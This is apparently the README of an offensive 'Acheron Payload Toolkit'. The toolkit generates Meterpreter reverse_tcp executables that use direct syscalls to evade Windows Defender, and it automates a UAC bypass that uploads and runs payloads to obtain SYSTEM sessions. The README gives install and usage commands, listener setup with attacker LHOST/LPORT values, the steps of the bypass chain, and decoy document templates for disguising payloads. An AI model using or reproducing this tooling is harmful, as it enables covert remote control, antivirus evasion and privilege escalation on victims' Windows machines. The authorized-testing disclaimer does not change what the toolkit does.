# Acheron Payload Toolkit

**Windows payload generator with Acheron direct syscalls for Defender evasion + automated UAC bypass (Method 59)**

Generates staged Meterpreter payloads (`windows/x64/meterpreter/reverse_tcp`) using **Acheron direct syscalls** for Windows Defender evasion. Includes fully automated UAC bypass (Method 59 - Debug Object / PPID Spoofing) via Metasploit post-exploitation module.

## Features

- **Direct Syscalls**: Uses Acheron library for `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` - bypasses userland API hooking
- **Staged Payload**: `windows/x64/meterpreter/reverse_tcp` (~511 bytes shellcode) - small, stealthy
- **Acheron EXE**: PE32+ x64, ~1.8 MB, direct syscalls for Defender evasion
- **Automated UAC Bypass (Method 59)**: Debug Object / PPID Spoofing via AppInfo RPC
- **Fully Automated**: Single command executes complete bypass chain
- **TUI Interface**: Interactive menu for payload generation and listener management
- **Meterpreter Upload**: Reliable file transfer via meterpreter `upload` command
- **Cross-compiled**: Built on Linux (Kali) for Windows x64

## Architecture

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  Kali (Attacker)│────▶│  Windows Target  │◀───│  Meterpreter    │
│                 │     │                  │     │  Session        │
│  • acherongen.sh│     │  • C:\Temp\      │     │                 │
│  • listener_gen │     │    uacbypass.exe │     │  • Session 1    │
│  • HTTP server  │     │    payload.exe   │     │  • SYSTEM (2)   │
└─────────────────┘     └──────────────────┘     └─────────────────┘
```

## Installation

### Prerequisites (Kali Linux)
```bash
sudo apt update && sudo apt install -y golang-go metasploit-framework mingw-w64
```

### Install Toolkit
```bash
git clone https://github.com/yourusername/acheron-toolkit.git
cd acheron-toolkit
chmod +x installer.sh
./installer.sh
```

Installs to:
- `~/acheron-toolkit/` - Toolkit files
- `~/.local/bin/acheron` - Global command
- `/usr/share/metasploit-framework/modules/post/windows/escalate/bypassuac_method59.rb` - Metasploit module

### Verify Installation
```bash
acheron
# or
acherongen.sh --help
```

## Usage

### 1. Generate Payload
```bash
# Interactive TUI
acheron
# Select 1 → LHOST → LPORT → Template (1=None)

# Direct command
acherongen.sh 192.168.1.100 4444 none
# Output: acheron_192.168.1.100_4444.exe (1.8 MB, PE32+ x64)
```

### 2. Start Listener (with UAC bypass auto-setup)
```bash
acheron
# Select 2 → LHOST → LPORT → y (launch msfconsole)
```
Generates `/tmp/acheron_listener_<PORT>.rc` with:
- `ExitOnSession false` (persistent listener)
- `InitialAutoRunScript` for UAC bypass alias

### 3. Execute UAC Bypass (when session received)
```bash
# In msfconsole after session received:
use post/windows/escalate/bypassuac_method59
set SESSION <session_id>
set LHOST <your_kali_ip>
set LPORT <your_port>
run
```

**Fully automated:**
1. Finds existing Acheron payload
2. Renames with random name
3. Uploads `uacbypass.exe` + payload to `C:\Temp`
5. Executes `uacbypass.exe payload.exe` (Method 59)
7. Opens SYSTEM session

### 4. Check Dependencies
```bash
acheron
# Select 3
```

## File Structure

```
acheron-toolkit/
├── toolkit.sh              # Main TUI
├── acherongen.sh           # Payload generator
├── listener_gen.sh         # Listener .rc generator
├── uacbypass.c             # UAC bypass source (Method 59)
├── uacbypass.exe           # Pre-compiled bypass binary
├── bypassuac_method59.rb   # Metasploit post-exploitation module
├── templates/
│   ├── fake.pdf
│   ├── fake.docx
│   └── fake.jpg
├── installer.sh
├── .github/workflows/test-payload.yml
├── README.md
├── LICENSE
└── .gitignore
```

## UAC Bypass Details (Method 59)

**Technique**: Debug Object / PPID Spoofing via AppInfo RPC

1. Launches `ComputerDefaults.exe` elevated via AppInfo RPC
2. Attaches as debugger to steal Debug Object
3. Uses `NtCreateProcessEx` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to spoof PPID
6. Executes payload as child of elevated process → runs as SYSTEM

**Requirements on target:**
- Windows 7/8/10/11 (x64)
- `C:\Temp` writable (default)
- `uacbypass.exe` + payload in same directory

## Building from Source

### Compile uacbypass.exe (Linux → Windows x64)
```bash
cd acheron-toolkit
x86_64-w64-mingw32-gcc uacbypass.c -o uacbypass.exe -static -mconsole -lshlwapi
```

### Cross-compile Payload (Linux → Windows x64)
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o payload.exe main.go
```

## GitHub Actions CI

`.github/workflows/test-payload.yml`:
- Checks out repo
- Verifies payload exists
- Tests msfvenom payload generation
- Runs static analysis on EXE

Trigger manually from Actions tab.

## Payload Details

| Property | Value |
|----------|-------|
| **Payload Type** | `windows/x64/meterpreter/reverse_tcp` (staged) |
| **Shellcode Size** | ~511 bytes |
| **EXE Size** | ~1.8 MB |
| **Format** | PE32+ x64 |
| **Evasion** | Acheron direct syscalls |
| **Compiler Flags** | `-ldflags="-s -w"` (strip symbols) |

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Upload fails | Check `C:\Temp` writable, try `session.fs.dir.mkdir` |
| Module not found | `reload_all` in msfconsole |
| Compilation fails | Install `mingw-w64`, check `uacbypass.c` |
| Session dies | Check `ExitOnSession false` in listener |
| No SYSTEM session | Verify `uacbypass.exe` on target, check AV |

## Security Notes

- **Authorized testing only** - Use only on systems you own or have explicit permission to test
- **Staged payload** - Requires listener running BEFORE victim executes payload
- **UAC bypass** - Requires `uacbypass.exe` on target (`C:\Temp\uacbypass.exe`)
- **Listener persistence** - `ExitOnSession false` keeps handler alive

## License

MIT License - See LICENSE file

## Disclaimer

This tool is for **authorized security testing only**. Unauthorized access to computer systems is illegal. Use only on systems you own or have explicit written permission to test.

---

*Generated by Acheron Payload Toolkit v1.0*